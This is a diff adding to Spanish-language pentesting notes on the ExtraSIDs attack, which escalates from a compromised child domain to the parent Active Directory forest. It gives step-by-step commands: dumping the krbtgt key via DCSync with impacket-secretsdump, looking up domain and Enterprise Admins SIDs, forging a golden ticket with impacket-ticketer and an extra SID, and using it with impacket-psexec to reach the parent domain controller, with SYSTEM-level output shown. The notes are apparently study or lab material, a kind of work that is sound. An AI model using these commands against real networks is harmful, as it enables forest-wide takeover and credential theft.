@@ -1,8 +1,19 @@
 # ExtraSids Attack - Mimikatz
 
+## Introducción
+
+El ataque **ExtraSIDs** permite a un atacante escalar privilegios desde un dominio hijo comprometido hacia el dominio padre dentro del mismo **Active Directory (AD) Forest**. Este ataque aprovecha la falta de filtrado de SIDs (**SID filtering**) en las relaciones de confianza entre dominios dentro de un mismo bosque, permitiendo que un usuario autenticado en el dominio hijo, con un ticket Kerberos que incluye un SID adicional (**extra SID**) del grupo **Enterprise Admins** del dominio padre, sea tratado como administrador en el dominio padre y, por ende, en todo el bosque.
+
+
 ## Explicación rápida
 
 - Este ataque permite comprometer a un dominio padre desde que el dominio hijo ya fue comprometido bajo el mismo **AD FOREST**.
+
+### Estructura de un AD Forest
+- **Dominio Padre**: Ejemplo: `poseidon.yzx`
+- **Dominio Hijo**: Ejemplo: `sub.poseidon.yzx`
+- **Relación de Confianza**: Existe una confianza bidireccional entre el dominio hijo y el padre, lo que permite la autenticación cruzada dentro del bosque.
+
 - ![](https://s38063.pcdn.co/wp-content/uploads/2022/06/Active-Directory-forest-.jpg.optimal.jpg)
 - Este ataque se basa en la explotación de propiedad sidHistory y la falta de protección de filtrado de SIDs (Sid filtering) entre dominios dentro de un AD FOREST.
 - Para hacer este ataque se necesitan las siguientes condiciones:
@@ -20,6 +31,9 @@
 
 ## Obtener SID de enterprise admin
 - `Get-DomainGroup -Domain DOMAIN.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`
+- Y si no también con:
+    - `Import-Module ActiveDirectory`
+    - `Get-ADGroup "Enterprise Admins" -Server DOMAIN.LOCAL`
 
 ## Mediante Linux
 
@@ -71,3 +85,116 @@ Microsoft Windows [Version 10.0.17763.107]
 C:\Windows\system32>whoami
 nt authority\system
 ```
+
+
+----
+
+##### Ejemplo 2 
+
+![SameForestTrust simetrico](image-1.png)
+
+## Requisitos
+
+Para ejecutar el ataque ExtraSIDs, necesitas obtener los siguientes elementos:
+
+1. **Clave AES256 o Hash NTLM del usuario `krbtgt` del dominio hijo**  
+   - **Cómo obtenerlo**:  
+     - Usa `impacket-secretsdump` para realizar un **DCSync**:  
+       ```bash
+       impacket-secretsdump -just-dc-user krbtgt <DOMINIO_HIJO>/<USUARIO>@<IP_DC_HIJO>
+       ```  
+     - Extrae el archivo `ntds.dit` del controlador de dominio hijo y procesa con:  
+       ```bash
+       impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
+       ```
+
+2. **SID del dominio hijo**  
+   - **Cómo obtenerlo**:  
+     - Usa `impacket-lookupsid`:  
+       ```bash
+       impacket-lookupsid <DOMINIO_HIJO>/<USUARIO>@<IP_DC_HIJO> | grep "Domain SID"
+       ```  
+     - O extrae el SID desde `ntds.dit`.
+
+3. **Nombre del usuario objetivo en el dominio hijo**  
+   - Ejemplo: `Administrator`.
+
+4. **FQDN del dominio hijo**  
+   - Ejemplo: `sub.poseidon.yzx`.
+
+5. **SID del grupo Enterprise Admins del dominio padre**  
+   - **Cómo obtenerlo**:  
+     - Usa BloodHound o PowerShell en el dominio padre:  
+       ```powershell
+       Get-DomainGroup -Domain <DOMINIO_PADRE> -Identity "Enterprise Admins" | select objectsid
+       ```  
+     - O con `impacket-lookupsid`:  
+       ```bash
+       impacket-lookupsid <DOMINIO_HIJO>/<USUARIO>@<IP_DC_PADRE> | grep -B12 "Enterprise Admins"
+       ```
+
+6. **IP o nombre del controlador de dominio del dominio padre**  
+   - Ejemplo: `dc01.poseidon.yzx` o `192.168.1.10`.
+
+## Ejecución del Ataque con `impacket-ticketer`
+
+### Paso 1: Forjar el Golden Ticket
+
+Usa `impacket-ticketer` para crear un ticket Kerberos en el dominio hijo que incluya un **extra SID** del dominio padre:
+
+```bash
+impacket-ticketer \
+  -aesKey <CLAVE_AES256_KRBTGT> \
+  -domain-sid <SID_DOMINIO_HIJO> \
+  -domain <FQDN_DOMINIO_HIJO> \
+  -user <NOMBRE_USUARIO> \
+  -user-id <RID_USUARIO> \
+  -groups <LISTA_GRUPOS> \
+  -extra-sid <SID_ENTERPRISE_ADMINS> \
+  -extra-pac \
+  <NOMBRE_TICKET>.ccache
+```
+
+#### Parámetros Explicados:
+- `-aesKey`: Clave AES256 del `krbtgt` del dominio hijo (alternativamente, usa `-nthash` para el hash NTLM).  
+- `-domain-sid`: SID del dominio hijo (ejemplo: `S-1-5-21-4168247447-1722543658-2110108262`).  
+- `-domain`: Nombre completo del dominio hijo (ejemplo: `sub.poseidon.yzx`).  
+- `-user`: Nombre del usuario objetivo (ejemplo: `Administrator`).  
+- `-user-id`: RID del usuario (ejemplo: `500` para Administrator).  
+- `-groups`: Lista de RIDs de grupos a los que pertenece el usuario (ejemplo: `512,513,518,519,520` para Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Creator Owners).  
+- `-extra-sid`: SID del grupo Enterprise Admins del dominio padre (ejemplo: `S-1-5-21-1190331060-1711709193-932631991-519`).  
+- `-extra-pac`: Asegura que el PAC incluya el extra SID.  
+- `<NOMBRE_TICKET>.ccache`: Nombre del archivo de ticket generado (ejemplo: `administrator.ccache`).
+
+#### Ejemplo Generalizado:
+```bash
+impacket-ticketer \
+  -aesKey <CLAVE_AES256_KRBTGT> \
+  -domain-sid S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx \
+  -domain <DOMINIO_HIJO> \
+  -user Administrator \
+  -user-id 500 \
+  -groups 512,513,518,519,520 \
+  -extra-sid S-1-5-21-yyyyyyyyyy-yyyyyyyyyy-yyyyyyyyyy-519 \
+  -extra-pac \
+  ticket.ccache
+```
+
+### Paso 2: Configurar el Ticket
+
+Configura el ticket como la credencial Kerberos activa en tu entorno:
+
+```bash
+export KRB5CCNAME=$(pwd)/<NOMBRE_TICKET>.ccache
+```
+
+### Paso 3: Acceder al Dominio Padre
+
+Usa herramientas de Impacket como `impacket-psexec` para autenticarte en el controlador de dominio del dominio padre:
+
+```bash
+impacket-psexec -k -no-pass <DOMINIO_HIJO>/<NOMBRE_USUARIO>@<IP_DC_PADRE>
+```
+
+- `-k`: Usa autenticación Kerberos con el ticket generado.  
+- `-no-pass`: No requiere contraseña adicional.  
